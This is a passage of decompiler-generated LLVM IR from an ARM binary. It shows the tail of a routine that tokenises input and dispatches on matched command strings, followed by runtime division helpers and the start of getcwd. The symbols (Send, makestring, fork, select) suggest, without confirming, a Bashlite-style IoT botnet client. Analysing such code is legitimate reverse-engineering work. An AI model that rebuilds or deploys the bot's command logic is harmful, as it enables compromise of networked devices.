dec_label_pc_ab24:                                ; preds = %dec_label_pc_ab08, %dec_label_pc_aaf0.dec_label_pc_ab24_crit_edge
  %v3_ab38.pre-phi = phi i8* [ %.pre37, %dec_label_pc_aaf0.dec_label_pc_ab24_crit_edge ], [ %v1_ab18, %dec_label_pc_ab08 ]
  %v2_ab30.pre-phi = phi i32 [ %.pre36, %dec_label_pc_aaf0.dec_label_pc_ab24_crit_edge ], [ %v2_ab14, %dec_label_pc_ab08 ]
  store i8 0, i8* %v3_ab38.pre-phi, align 1
  store i32 %storemerge34.in, i32* @r1, align 4
  %v4_ab50 = call i32 @strcpy(i8* %v3_ab50, i32 %storemerge34.in)
  %v1_ab64 = add i32 %v2_ab30.pre-phi, 1
  store i32 %v1_ab64, i32* @r1, align 4
  %v4_ab70 = call i32 @strcpy(i8* %storemerge34, i32 %v1_ab64)
  %v8_ac08119 = load i32, i32* bitcast ([4 x i8]** @global_var_231f4.171 to i32*), align 4
  %v2_ac0c121 = icmp eq i32 %v8_ac08119, 0
  br i1 %v2_ac0c121, label %dec_label_pc_ac14, label %dec_label_pc_ab80

dec_label_pc_ab80:                                ; preds = %dec_label_pc_ab24, %dec_label_pc_ab80
  %v7_ac08124 = phi i32* [ %v7_ac08, %dec_label_pc_ab80 ], [ bitcast ([4 x i8]** @global_var_231f4.171 to i32*), %dec_label_pc_ab24 ]
  %storemerge21122 = phi i32 [ %v1_abf8, %dec_label_pc_ab80 ], [ 0, %dec_label_pc_ab24 ]
  %v7_ab88 = load i32, i32* %v7_ac08124, align 4
  %v2_aba0 = inttoptr i32 %v7_ab88 to i8*
  %v3_aba0 = call i32 @__GI_strcasecmp(i8* %v2_aba0, i32 %v2_ab44)
  %v3_abbc = mul i32 %storemerge21122, 8
  %v2_abc4 = add i32 %v3_abbc, add (i32 ptrtoint ([4 x i8]** @global_var_231f4.171 to i32), i32 4)
  %v1_abc8 = inttoptr i32 %v2_abc4 to i32*
  %v2_abc8 = load i32, i32* %v1_abc8, align 4
  store i32 44020, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_abc8)
  %v1_abf8 = add i32 %storemerge21122, 1
  %v5_ac08 = mul i32 %v1_abf8, 8
  %v6_ac08 = add i32 %v5_ac08, ptrtoint ([4 x i8]** @global_var_231f4.171 to i32)
  %v7_ac08 = inttoptr i32 %v6_ac08 to i32*
  %v8_ac08 = load i32, i32* %v7_ac08, align 4
  %v2_ac0c = icmp eq i32 %v8_ac08, 0
  br i1 %v2_ac0c, label %dec_label_pc_ac14, label %dec_label_pc_ab80

dec_label_pc_ac14:                                ; preds = %dec_label_pc_ab80, %dec_label_pc_ab24
  %v4_ac28 = call i32 @__GI_strcasecmp(i8* %v3_ab50, i32 ptrtoint ([6 x i8]* @global_var_198c4.173 to i32))
  %v2_ac30 = icmp eq i32 %v4_ac28, 0
  br i1 %v2_ac30, label %dec_label_pc_a658, label %dec_label_pc_ac38

dec_label_pc_ac38:                                ; preds = %dec_label_pc_ac14
  store i32 0, i32* @r0, align 4
  %v6_ac40 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_198bc.166 to i32), i32 ptrtoint ([4 x i8]** @global_var_231f4.171 to i32), i32 %v4_ac28, i32 ptrtoint (i32* @0 to i32))
  %v2_ac50 = icmp eq i32 %v6_ac40, 0
  br i1 %v2_ac50, label %dec_label_pc_a6c8.lr.ph, label %dec_label_pc_ac58

dec_label_pc_ac58:                                ; preds = %dec_label_pc_a9b8, %dec_label_pc_ac38
  %storemerge34.in = phi i32 [ %v6_ac40, %dec_label_pc_ac38 ], [ %v6_a9ec, %dec_label_pc_a9b8 ]
  %storemerge34 = inttoptr i32 %storemerge34.in to i8*
  %v2_ac5c = load i8, i8* %storemerge34, align 1
  %v2_ac60 = icmp eq i8 %v2_ac5c, 0
  br i1 %v2_ac60, label %dec_label_pc_a6c8.lr.ph, label %dec_label_pc_a9fc

; uselistorder directives
  uselistorder i8* %storemerge34, { 6, 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %storemerge34.in, { 7, 3, 2, 4, 1, 0, 6, 5 }
  uselistorder i32* %v7_ac08, { 1, 0 }
  uselistorder i32 %v1_abf8, { 1, 0 }
  uselistorder i32 %storemerge21122, { 1, 0 }
  uselistorder i32 %.pre36, { 1, 0 }
  uselistorder i32 %storemerge20, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge23, { 2, 1, 0, 3 }
  uselistorder i32 %v4_a9a0, { 1, 0, 2 }
  uselistorder i32 %v2_a938, { 2, 1, 0 }
  uselistorder i32 %v1_a8dc, { 1, 0 }
  uselistorder i32 %v3_a8a8, { 1, 0 }
  uselistorder i32 %storemerge18105, { 1, 0 }
  uselistorder i32 %v1_a88c, { 1, 0 }
  uselistorder i32 %v2_a858, { 1, 0 }
  uselistorder i32 %v2_a848, { 1, 0 }
  uselistorder i32 %v1_a7e0, { 0, 2, 1 }
  uselistorder i32 %v2_a85894, { 1, 0 }
  uselistorder i32 %v3_a85493, { 1, 0 }
  uselistorder i32 %.pre136, { 1, 4, 0, 3, 2 }
  uselistorder i32 %storemerge16118, { 1, 0 }
  uselistorder i32 %v2_a6f4, { 1, 0 }
  uselistorder i32 %storemerge1529, { 1, 0 }
  uselistorder i32 %v2_aa88, { 1, 0 }
  uselistorder i32 %v2_a98c, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_a6b4, { 1, 0 }
  uselistorder i32 %v1_a5cc, { 1, 0 }
  uselistorder i32 %storemerge14, { 2, 0, 1 }
  uselistorder i32 %v3_a45c, { 1, 0, 2 }
  uselistorder i32 %v2_a3c0, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-76.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1684, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_231f4.171 to i32), { 1, 2, 0 }
  uselistorder [4 x i8]** @global_var_231f4.171, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_strtok, { 1, 0 }
  uselistorder i32* @global_var_26550.45, { 1, 3, 4, 5, 0, 6, 7, 8, 2, 9, 10 }
  uselistorder i32* @global_var_23464.43, { 7, 8, 1, 5, 9, 10, 2, 0, 11, 3, 12, 4, 6, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @Send, { 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 4, 3, 2, 1, 5, 0 }
  uselistorder i32* @global_var_26538.34, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1, 14, 15 }
  uselistorder i32* @global_var_26540.128, { 0, 1, 4, 2, 5, 6, 7, 3 }
  uselistorder i32* @global_var_26530.156, { 1, 0 }
  uselistorder i32* @global_var_2652c.54, { 1, 0 }
  uselistorder i32* @global_var_26534.88, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_19810.118 to i32), { 4, 5, 1, 0, 3, 2 }
  uselistorder i32 (i32)* @makestring, { 1, 0 }
  uselistorder i32 ()* @__getpid, { 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 2, 0, 1 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19604.50 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i8** %argv, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ac58, { 1, 0 }
  uselistorder label %dec_label_pc_ab80, { 1, 0 }
  uselistorder label %dec_label_pc_aaf0, { 1, 0 }
  uselistorder label %dec_label_pc_aad8, { 1, 0 }
  uselistorder label %dec_label_pc_aa2c, { 1, 0 }
  uselistorder label %dec_label_pc_a914, { 1, 0 }
  uselistorder label %dec_label_pc_a8f8, { 1, 0 }
  uselistorder label %dec_label_pc_a8a4, { 1, 0 }
  uselistorder label %dec_label_pc_a7ec, { 1, 0 }
  uselistorder label %dec_label_pc_a6c8, { 1, 0 }
  uselistorder label %dec_label_pc_a6c8.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_a658, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_a57c, { 1, 0 }
  uselistorder label %dec_label_pc_a4bc, { 1, 0 }
  uselistorder label %dec_label_pc_a4a4, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a37c, { 1, 0 }
  uselistorder label %dec_label_pc_a308, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_acd8 = load i32, i32* @r1, align 4
  %v1_acd8 = icmp slt i32 %v0_acd8, 0
  %v2_acd8 = icmp eq i32 %v0_acd8, 0
  %v2_acdc = xor i32 %v0_acd8, %arg1
  br i1 %v2_acd8, label %dec_label_pc_adf0, label %dec_label_pc_ace4

dec_label_pc_ace4:                                ; preds = %entry
  br i1 %v1_acd8, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_ace4
  %v2_ace4 = sub i32 0, %v0_acd8
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_ace4, %bb
  %v1_adb0 = phi i32 [ %v2_ace4, %bb ], [ %v0_acd8, %dec_label_pc_ace4 ]
  %v1_ace8 = add i32 %v1_adb0, -1
  %v7_ace8 = icmp eq i32 %v1_adb0, 1
  br i1 %v7_ace8, label %dec_label_pc_ad90, label %dec_label_pc_acf0

dec_label_pc_acf0:                                ; preds = %thread-pre-split
  %v1_acf0 = icmp slt i32 %arg1, 0
  br i1 %v1_acf0, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_acf0
  %v2_acf4 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_acf0, %bb85
  %v0_ade4 = phi i32 [ %arg1, %dec_label_pc_acf0 ], [ %v2_acf4, %bb85 ]
  %v3_acf8 = icmp uge i32 %v0_ade4, %v1_adb0
  %v9_acf8 = icmp eq i32 %v0_ade4, %v1_adb0
  %v2_acfc = xor i1 %v3_acf8, true
  %v3_acfc = or i1 %v9_acf8, %v2_acfc
  br i1 %v3_acfc, label %dec_label_pc_ad9c, label %dec_label_pc_ad00

dec_label_pc_ad00:                                ; preds = %bb86
  %v2_ad00 = and i32 %v1_ace8, %v1_adb0
  %v4_ad00 = icmp eq i32 %v2_ad00, 0
  br i1 %v4_ad00, label %dec_label_pc_adac, label %dec_label_pc_ad08

dec_label_pc_ad08:                                ; preds = %dec_label_pc_ad00
  %v3_ad08 = icmp ult i32 %v1_adb0, 536870912
  br i1 %v3_ad08, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_ad08
  %v4_ad0c = mul i32 %v1_adb0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_ad08, %.thread
  %v0_ad2c.pr40.ph = phi i32 [ %v4_ad0c, %.thread ], [ %v1_adb0, %dec_label_pc_ad08 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_ad08 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_ad2c.pr40 = phi i32 [ %v4_ad20, %bb89 ], [ %v0_ad2c.pr40.ph, %.preheader.preheader ]
  %v1_ad24 = phi i32 [ %v4_ad24, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_ad18 = icmp ugt i32 %v0_ad2c.pr40, 268435455
  br i1 %v2_ad18, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_ad2cthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_ad1c = icmp ult i32 %v0_ad2c.pr40, %v0_ade4
  br i1 %v4_ad1c, label %bb88, label %dec_label_pc_ad2cthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_ad20 = and i32 %v0_ad2c.pr40, 268435456
  %v3_ad20 = icmp eq i32 %v2_ad20, 0
  %v4_ad20 = mul i32 %v0_ad2c.pr40, 16
  br i1 %v3_ad20, label %bb89, label %dec_label_pc_ad2c.loopexit

bb89:                                             ; preds = %bb88
  %v2_ad24 = and i32 %v1_ad24, 268435456
  %v3_ad24 = icmp eq i32 %v2_ad24, 0
  %v4_ad24 = mul i32 %v1_ad24, 16
  br i1 %v3_ad24, label %.preheader, label %dec_label_pc_ad2cthread-pre-split.loopexit.loopexit

dec_label_pc_ad2cthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_ad3852.ph = phi i32 [ %v1_ad24, %bb87 ], [ %v4_ad24, %bb89 ]
  %v0_ad2c.pr42.ph = phi i32 [ %v0_ad2c.pr40, %bb87 ], [ %v4_ad20, %bb89 ]
  br label %dec_label_pc_ad2cthread-pre-split.loopexit

dec_label_pc_ad2cthread-pre-split.loopexit:       ; preds = %dec_label_pc_ad2cthread-pre-split.loopexit.loopexit, %.thread3
  %v1_ad3852 = phi i32 [ %v1_ad24, %.thread3 ], [ %v1_ad3852.ph, %dec_label_pc_ad2cthread-pre-split.loopexit.loopexit ]
  %v0_ad2c.pr42 = phi i32 [ %v0_ad2c.pr40, %.thread3 ], [ %v0_ad2c.pr42.ph, %dec_label_pc_ad2cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_ad2cthread-pre-split

dec_label_pc_ad2cthread-pre-split:                ; preds = %dec_label_pc_ad2cthread-pre-split.loopexit, %bb91
  %v1_ad3850 = phi i32 [ %v1_ad3852, %dec_label_pc_ad2cthread-pre-split.loopexit ], [ %v3_ad38, %bb91 ]
  %v2_ad3048 = phi i32 [ %v0_ade4, %dec_label_pc_ad2cthread-pre-split.loopexit ], [ %v2_ad30, %bb91 ]
  %v0_ad2c.pr = phi i32 [ %v0_ad2c.pr42, %dec_label_pc_ad2cthread-pre-split.loopexit ], [ %v3_ad34, %bb91 ]
  br label %dec_label_pc_ad2c

dec_label_pc_ad2c.loopexit:                       ; preds = %bb88
  br label %dec_label_pc_ad2c

dec_label_pc_ad2c:                                ; preds = %dec_label_pc_ad2c.loopexit, %dec_label_pc_ad2cthread-pre-split
  %v1_ad38 = phi i32 [ %v1_ad3850, %dec_label_pc_ad2cthread-pre-split ], [ %v1_ad24, %dec_label_pc_ad2c.loopexit ]
  %v2_ad30 = phi i32 [ %v2_ad3048, %dec_label_pc_ad2cthread-pre-split ], [ %v0_ade4, %dec_label_pc_ad2c.loopexit ]
  %v1_ad34 = phi i32 [ %v0_ad2c.pr, %dec_label_pc_ad2cthread-pre-split ], [ %v4_ad20, %dec_label_pc_ad2c.loopexit ]
  %v2_ad2c = icmp slt i32 %v1_ad34, 0
  br i1 %v2_ad2c, label %dec_label_pc_ad40, label %bb90

bb90:                                             ; preds = %dec_label_pc_ad2c
  %v4_ad30 = icmp ult i32 %v1_ad34, %v2_ad30
  br i1 %v4_ad30, label %bb91, label %dec_label_pc_ad40

bb91:                                             ; preds = %bb90
  %v3_ad34 = mul i32 %v1_ad34, 2
  %v2_ad38 = icmp slt i32 %v1_ad38, 0
  %v3_ad38 = mul i32 %v1_ad38, 2
  br i1 %v2_ad38, label %dec_label_pc_ad40, label %dec_label_pc_ad2cthread-pre-split

dec_label_pc_ad40:                                ; preds = %bb90, %dec_label_pc_ad2c, %bb91
  %v2_ad4c63 = phi i32 [ %v3_ad38, %bb91 ], [ %v1_ad38, %bb90 ], [ %v1_ad38, %dec_label_pc_ad2c ]
  %v1_ad4455 = phi i32 [ %v3_ad34, %bb91 ], [ %v1_ad34, %bb90 ], [ %v1_ad34, %dec_label_pc_ad2c ]
  br label %dec_label_pc_ad44

dec_label_pc_ad44:                                ; preds = %.thread13, %dec_label_pc_ad40
  %v1_ad78 = phi i32 [ %v4_ad78, %.thread13 ], [ %v2_ad4c63, %dec_label_pc_ad40 ]
  %v1_ad4c = phi i32 [ %v1_ad88, %.thread13 ], [ 0, %dec_label_pc_ad40 ]
  %v1_ad7c = phi i32 [ %v4_ad7c, %.thread13 ], [ %v1_ad4455, %dec_label_pc_ad40 ]
  %v1_ad48 = phi i32 [ %v0_ad74, %.thread13 ], [ %v0_ade4, %dec_label_pc_ad40 ]
  %v3_ad44 = icmp ult i32 %v1_ad48, %v1_ad7c
  br i1 %v3_ad44, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_ad44
  %v3_ad48 = sub i32 %v1_ad48, %v1_ad7c
  %v3_ad4c = or i32 %v1_ad4c, %v1_ad78
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_ad44, %bb92
  %v1_ad54 = phi i32 [ %v1_ad48, %dec_label_pc_ad44 ], [ %v3_ad48, %bb92 ]
  %v1_ad58 = phi i32 [ %v1_ad4c, %dec_label_pc_ad44 ], [ %v3_ad4c, %bb92 ]
  %v4_ad50 = udiv i32 %v1_ad7c, 2
  %v6_ad50 = icmp ult i32 %v1_ad54, %v4_ad50
  br i1 %v6_ad50, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_ad54 = urem i32 %v1_ad7c, 2
  %v4_ad54 = icmp eq i32 %v3_ad54, 0
  %v6_ad54 = sub i32 %v1_ad54, %v4_ad50
  br i1 %v4_ad54, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_ad58 = udiv i32 %v1_ad78, 2
  %v6_ad58 = or i32 %v1_ad58, %v5_ad58
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_ad60 = phi i32 [ %v6_ad54, %bb93 ], [ %v1_ad54, %.thread8 ], [ %v6_ad54, %bb94 ]
  %v1_ad64 = phi i32 [ %v1_ad58, %bb93 ], [ %v1_ad58, %.thread8 ], [ %v6_ad58, %bb94 ]
  %v4_ad5c = udiv i32 %v1_ad7c, 4
  %v6_ad5c = icmp ult i32 %v1_ad60, %v4_ad5c
  br i1 %v6_ad5c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_ad60 = and i32 %v1_ad7c, 2
  %v4_ad60 = icmp eq i32 %v3_ad60, 0
  %v6_ad60 = sub i32 %v1_ad60, %v4_ad5c
  br i1 %v4_ad60, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_ad64 = udiv i32 %v1_ad78, 4
  %v6_ad64 = or i32 %v1_ad64, %v5_ad64
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_ad6c = phi i32 [ %v6_ad60, %bb95 ], [ %v1_ad60, %.thread9 ], [ %v6_ad60, %bb96 ]
  %v1_ad70 = phi i32 [ %v1_ad64, %bb95 ], [ %v1_ad64, %.thread9 ], [ %v6_ad64, %bb96 ]
  %v4_ad68 = udiv i32 %v1_ad7c, 8
  %v6_ad68 = icmp ult i32 %v1_ad6c, %v4_ad68
  br i1 %v6_ad68, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_ad6c = and i32 %v1_ad7c, 4
  %v4_ad6c = icmp eq i32 %v3_ad6c, 0
  %v6_ad6c = sub i32 %v1_ad6c, %v4_ad68
  br i1 %v4_ad6c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_ad70 = udiv i32 %v1_ad78, 8
  %v6_ad70 = or i32 %v1_ad70, %v5_ad70
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_ad88 = phi i32 [ %v1_ad70, %bb97 ], [ %v1_ad70, %.thread10 ], [ %v6_ad70, %bb98 ]
  %v0_ad74 = phi i32 [ %v6_ad6c, %bb97 ], [ %v1_ad6c, %.thread10 ], [ %v6_ad6c, %bb98 ]
  %v2_ad74 = icmp eq i32 %v0_ad74, 0
  br i1 %v2_ad74, label %dec_label_pc_ad84, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_ad78, 16
  br i1 %tmp, label %dec_label_pc_ad84, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_ad78 = udiv i32 %v1_ad78, 16
  %v4_ad7c = udiv i32 %v1_ad7c, 16
  br label %dec_label_pc_ad44

dec_label_pc_ad84:                                ; preds = %thread-pre-split12, %bb99
  %v1_ad84 = icmp slt i32 %v2_acdc, 0
  br i1 %v1_ad84, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_ad84
  %v2_ad88 = sub i32 0, %v1_ad88
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_ad90, %dec_label_pc_ad84, %bb100
  %v1_ad8c = phi i32 [ %v1_ad88, %dec_label_pc_ad84 ], [ %v2_ad88, %bb100 ], [ %arg1, %dec_label_pc_ad90 ], [ %v2_ad94, %bb101 ], [ %v1_ada880, %bb103 ], [ %v2_ada4, %bb104 ]
  ret i32 %v1_ad8c

dec_label_pc_ad90:                                ; preds = %thread-pre-split
  br i1 %v1_acd8, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_ad90
  %v2_ad94 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_ad9c:                                ; preds = %bb86
  br i1 %v3_acf8, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_ad9c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_ad9c, %bb102
  %v1_ada880 = phi i32 [ %arg1, %dec_label_pc_ad9c ], [ 0, %bb102 ]
  br i1 %v9_acf8, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_ada0 = ashr i32 %v2_acdc, 31
  %v2_ada4 = or i32 %v4_ada0, 1
  br label %.thread16

dec_label_pc_adac:                                ; preds = %dec_label_pc_ad00
  %v2_adac = icmp ugt i32 %v1_adb0, 65535
  br i1 %v2_adac, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_adac
  %v2_adb0 = and i32 %v1_adb0, 32768
  %v3_adb0 = icmp eq i32 %v2_adb0, 0
  %v4_adb0 = udiv i32 %v1_adb0, 65536
  br i1 %v3_adb0, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_adac
  %v0_adbc70 = phi i32 [ %v1_adb0, %dec_label_pc_adac ], [ %v4_adb0, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_adc0 = phi i32 [ %v0_adbc70, %.thread19 ], [ %v4_adb0, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_adbc = icmp ugt i32 %v1_adc0, 255
  br i1 %v2_adbc, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_adc0 = and i32 %v1_adc0, 128
  %v3_adc0 = icmp eq i32 %v2_adc0, 0
  %v4_adc0 = udiv i32 %v1_adc0, 256
  br i1 %v3_adc0, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_adc4 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_add0 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_adc4, %bb108 ]
  %v1_adcc = phi i32 [ %v1_adc0, %bb106 ], [ %v4_adc0, %bb107 ], [ %v4_adc0, %bb108 ]
  %v2_adc8 = icmp ugt i32 %v1_adcc, 15
  br i1 %v2_adc8, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_adcc = and i32 %v1_adcc, 8
  %v3_adcc = icmp eq i32 %v2_adcc, 0
  %v4_adcc = udiv i32 %v1_adcc, 16
  br i1 %v3_adcc, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_add0 = add nsw i32 %v1_add0, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_add8 = phi i32 [ %v1_add0, %.thread20 ], [ %v1_add0, %bb109 ], [ %v2_add0, %bb110 ]
  %v5_addc = phi i32 [ %v1_adcc, %.thread20 ], [ %v4_adcc, %bb109 ], [ %v4_adcc, %bb110 ]
  %v2_add4 = icmp ugt i32 %v5_addc, 3
  %v7_add4 = icmp eq i32 %v5_addc, 4
  %v2_add8 = xor i1 %v7_add4, true
  %v3_add8 = and i1 %v2_add4, %v2_add8
  br i1 %v3_add8, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_add8 = add nsw i32 %v4_add8, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_addc = phi i32 [ %v4_add8, %.thread21 ], [ %v5_add8, %bb111 ]
  %v2_addc = xor i1 %v2_add4, true
  %v3_addc = or i1 %v7_add4, %v2_addc
  br i1 %v3_addc, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_addc = udiv i32 %v5_addc, 2
  %v9_addc = add i32 %v4_addc, %v8_addc
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_ade4 = phi i32 [ %v4_addc, %bb112 ], [ %v9_addc, %bb113 ]
  %v1_ade0 = icmp slt i32 %v2_acdc, 0
  %v6_ade4 = lshr i32 %v0_ade4, %v1_ade4
  %v2_ade8 = sub i32 0, %v6_ade4
  %v2_ade8.v6_ade4 = select i1 %v1_ade0, i32 %v2_ade8, i32 %v6_ade4
  ret i32 %v2_ade8.v6_ade4

dec_label_pc_adf0:                                ; preds = %entry
  %v0_adf4 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_addc, { 1, 0 }
  uselistorder i1 %v7_add4, { 1, 0 }
  uselistorder i32 %v4_adcc, { 1, 0 }
  uselistorder i32 %v1_adcc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_adc0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_adc0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_adb0, { 1, 0 }
  uselistorder i32 %v0_ad74, { 1, 0 }
  uselistorder i32 %v4_ad68, { 1, 0 }
  uselistorder i32 %v1_ad70, { 1, 2, 0 }
  uselistorder i32 %v4_ad5c, { 1, 0 }
  uselistorder i32 %v1_ad64, { 1, 2, 0 }
  uselistorder i32 %v4_ad50, { 1, 0 }
  uselistorder i32 %v1_ad58, { 1, 2, 0 }
  uselistorder i32 %v1_ad7c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_ad4c, { 1, 0 }
  uselistorder i32 %v1_ad78, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_ad38, { 1, 0 }
  uselistorder i32 %v3_ad34, { 1, 0 }
  uselistorder i32 %v1_ad34, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_ad30, { 1, 0 }
  uselistorder i32 %v1_ad38, { 1, 2, 0, 3 }
  uselistorder i32 %v4_ad24, { 1, 0 }
  uselistorder i32 %v4_ad20, { 2, 1, 0 }
  uselistorder i32 %v1_ad24, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_ad2c.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_acf8, { 1, 0 }
  uselistorder i32 %v1_adb0, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_acdc, { 1, 0, 2 }
  uselistorder i32 %v0_acd8, { 2, 1, 0, 4, 3 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_ad84, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_ad40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ad2cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_ae08 = sdiv i32 %arg1, %arg2
  ret i32 %v2_ae08
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_ae24 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_ae24
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_ae30 = load i32, i32* @r4, align 4
  %v6_ae30 = load i32, i32* @r5, align 4
  %v9_ae30 = load i32, i32* @r6, align 4
  %v12_ae30 = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_ae34 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r4, align 4
  %v2_ae44 = icmp eq i32 %arg1, 0
  br i1 %v2_ae34, label %dec_label_pc_ae44, label %dec_label_pc_ae7c

dec_label_pc_ae44:                                ; preds = %entry
  br i1 %v2_ae44, label %dec_label_pc_ae68, label %dec_label_pc_ae4c

dec_label_pc_ae4c:                                ; preds = %dec_label_pc_ae44
  %v0_ae50 = call i32 @__aeabi_read_tp()
  %v3_ae54 = load i16, i16* @global_var_23164.175, align 2
  %v4_ae54 = sext i16 %v3_ae54 to i32
  %v0_ae5c = load i32, i32* @r6, align 4
  store i32 %v0_ae5c, i32* @r4, align 4
  %v3_ae60 = add i32 %v4_ae54, %v0_ae50
  %v4_ae60 = inttoptr i32 %v3_ae60 to i32*
  store i32 22, i32* %v4_ae60, align 4
  br label %dec_label_pc_af18

